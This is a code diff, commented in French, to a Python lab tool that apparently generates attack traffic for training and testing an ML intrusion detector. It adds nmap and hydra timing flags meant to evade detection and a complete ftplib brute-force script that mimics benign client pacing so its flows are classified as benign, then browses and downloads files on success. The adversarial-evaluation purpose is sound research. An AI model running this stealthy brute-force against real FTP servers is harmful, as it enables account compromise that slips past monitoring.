@@ -56,12 +56,25 @@ TARGET_RE = re.compile(r"^\d{1,3}(?:\.\d{1,3}){3}(?:/\d{1,2})?$")
 
 # Vitesses d'attaque : faire varier le rythme diversifie les flux d'un dataset
 # (un scan lent n'a pas les mêmes durées / inter-arrivées qu'un scan rapide).
-#   nmap  : modèle de temporisation -T ;  hydra : nombre de connexions parallèles -t.
+#   nmap  : options de temporisation (modèle -T, éventuellement --scan-delay / --max-rate) ;
+#   hydra : options de cadence (nombre de connexions parallèles -t, attente -W).
+# Les valeurs peuvent contenir plusieurs options séparées par des espaces : elles sont
+# découpées en arguments à la construction de la commande.
+#
+# « Évasion » est une vitesse à part : c'est l'attaque de temporisation de l'état de l'art
+# (Han/TrafficManipulator, Sharon/TANTRA). Le modèle n'a appris que des scans et des forces
+# brutes denses (-T2 à -T5, -t≥1 en rafale). En étalant fortement les paquets, le trafic
+# malveillant prend un rythme proche du bénin : ses features de temps (Fwd/Flow IAT) et de
+# volume sortent de la zone « attaque » apprise, et le modèle peut le classer BENIGN. À ne
+# pas utiliser pour entraîner : c'est la variante à lancer *contre* un modèle déjà entraîné.
 SPEEDS = {
-    "slow": {"label": "Lente", "nmap": "-T2", "hydra": "1"},
-    "normal": {"label": "Normale", "nmap": "-T3", "hydra": "2"},
-    "fast": {"label": "Rapide", "nmap": "-T4", "hydra": "4"},
-    "insane": {"label": "Très rapide", "nmap": "-T5", "hydra": "16"},
+    "slow": {"label": "Lente", "nmap": "-T2", "hydra": "-t 1"},
+    "normal": {"label": "Normale", "nmap": "-T3", "hydra": "-t 2"},
+    "fast": {"label": "Rapide", "nmap": "-T4", "hydra": "-t 4"},
+    "insane": {"label": "Très rapide", "nmap": "-T5", "hydra": "-t 16"},
+    "evasion": {"label": "Évasion (furtif, temporisé)",
+                "nmap": "-T2 --scan-delay 250ms --max-rate 8",
+                "hydra": "-t 1 -W 1"},
 }
 DEFAULT_SPEED = "fast"
 
@@ -69,17 +82,78 @@ DEFAULT_SPEED = "fast"
 def _bruteforce_cmd(service: str, target: str, speed: str) -> list:
     """Commande hydra : écrit la liste de mots de passe puis tente l'authentification."""
     passwords = " ".join(WORDLIST)
-    tasks = SPEEDS[speed]["hydra"]
+    flags = SPEEDS[speed]["hydra"]
     return [
         "sh", "-c",
         f"printf '%s\\n' {passwords} > /tmp/pw.txt && "
-        f"hydra -l {LAB_USER} -P /tmp/pw.txt -t {tasks} -f -I {service}://{target}",
+        f"hydra -l {LAB_USER} -P /tmp/pw.txt {flags} -f -I {service}://{target}",
     ]
 
 
 def _nmap_cmd(*args: str):
-    """Commande nmap (cible et vitesse ajoutées au lancement)."""
-    return lambda t, speed: ["nmap", *args, SPEEDS[speed]["nmap"], t]
+    """Commande nmap (cible et vitesse ajoutées au lancement ; la vitesse peut tenir plusieurs options)."""
+    return lambda t, speed: ["nmap", *args, *SPEEDS[speed]["nmap"].split(), t]
+
+
+# --------------------------------------------------------------------------- évasion Okada
+#
+# Force brute FTP « furtive » : évasion par mimétisme du trafic bénin (inspirée d'Okada et al.,
+# « XAI-driven black-box adversarial attacks », voir l'état de l'art). Le modèle décide PAR FLUX
+# (features CICFlowMeter) : la temporisation seule ne l'évade pas (cf. rapport d'évasion), car elle
+# ne change pas la forme d'un flux. Ici on change la forme : au lieu de hydra (dont la micro-structure
+# des logins ratés a été apprise comme « ftp-patator »), on utilise le MÊME client que l'agent de
+# trafic bénin — ftplib — avec la MÊME cadence humaine. Chaque essai raté produit alors un flux
+# quasi identique au « login raté » que l'agent bénin génère déjà (traffic_agent.HumanUser.ftp).
+# Objectif : que le modèle ne sache plus distinguer ces flux du bénin.
+_FTP_STEALTH_TEMPLATE = r'''
+import ftplib, random, sys, time
+TARGET = sys.argv[1]
+USER = %USER%
+WORDLIST = %WORDLIST%
+REMOTE = ["notes.txt", "data/ventes.csv", "data/rapport.pdf", "backup/archive.tar.gz"]
+rng = random.Random()
+def think(a, b): time.sleep(rng.uniform(a, b))
+def attempt(pw):
+    ftp = ftplib.FTP()
+    try:
+        ftp.connect(TARGET, 21, timeout=10)
+        try:
+            ftp.login(USER, pw)
+        except ftplib.error_perm:
+            return False  # login raté : flux identique au "typo" de l'agent benin
+        # succes : on se comporte comme un client legitime (LIST + telechargements)
+        try:
+            ftp.retrlines("LIST", lambda _l: None)
+            for _ in range(rng.randint(1, 3)):
+                think(0.5, 2.5)
+                ftp.retrbinary("RETR " + rng.choice(REMOTE), lambda _c: None)
+        except Exception:
+            pass
+        try: ftp.quit()
+        except Exception: pass
+        return True
+    except Exception:
+        return False
+    finally:
+        try: ftp.close()
+        except Exception: pass
+found = False
+for pw in WORDLIST:
+    if attempt(pw):
+        found = True
+        break
+    think(1.0, 4.0)  # cadence humaine, comme l'agent benin (pas une rafale hydra)
+print("ftp-stealth done found=%r" % found)
+'''
+
+
+def _ftp_stealth_cmd(target: str) -> list:
+    """Force brute FTP mimant le client bénin (ftplib). La vitesse est ignorée : la cadence
+    est volontairement « humaine » pour ressembler au trafic de fond."""
+    script = (_FTP_STEALTH_TEMPLATE
+              .replace("%USER%", repr(LAB_USER))
+              .replace("%WORDLIST%", repr(list(WORDLIST))))
+    return ["python3", "-c", script, target]
 
 # Profils de trafic bénin proposés à l'utilisateur (le détail du rythme est dans traffic_agent.py).
 # Fréquence du trafic (le libellé indique le débit ; les intervalles sont dans
@@ -156,6 +230,17 @@ ATTACKS = {
         "label": ("force-brute", "ftp-patator"),
         "command": lambda t, speed: _bruteforce_cmd("ftp", t, speed),
     },
+    "ftp-bruteforce-stealth": {
+        "name": "Force brute FTP (furtive, évasion)",
+        "description": ("Force brute FTP qui imite le client bénin (ftplib) et sa cadence humaine : "
+                        "chaque essai ressemble à un login raté légitime. Évasion inspirée d'Okada "
+                        "(on change la forme des flux, pas seulement le rythme)."),
+        "needs": "ip",
+        "tool": "python-ftp",
+        "service": "ftp",
+        "label": ("force-brute", "ftp-patator-stealth"),
+        "command": lambda t, speed: _ftp_stealth_cmd(t),
+    },
 }
 
 
@@ -163,8 +248,11 @@ def command_preview(attack_id: str, speed: str, target: str = "<cible>") -> str:
     """Commande lancée par une attaque, lisible (la liste de mots de passe est résumée)."""
     attack = ATTACKS[attack_id]
     if attack["tool"] == "hydra":
-        return (f"hydra -l {LAB_USER} -P <{len(WORDLIST)} mots de passe> -t {SPEEDS[speed]['hydra']} "
+        return (f"hydra -l {LAB_USER} -P <{len(WORDLIST)} mots de passe> {SPEEDS[speed]['hydra']} "
                 f"-f {attack['service']}://{target}")
+    if attack["tool"] == "python-ftp":
+        return (f"python3 ftp_stealth.py {target}  # imite ftplib (client bénin) : "
+                f"{len(WORDLIST)} essais à cadence humaine, session LIST/RETR après succès")
     return " ".join(attack["command"](target, speed))
 
 
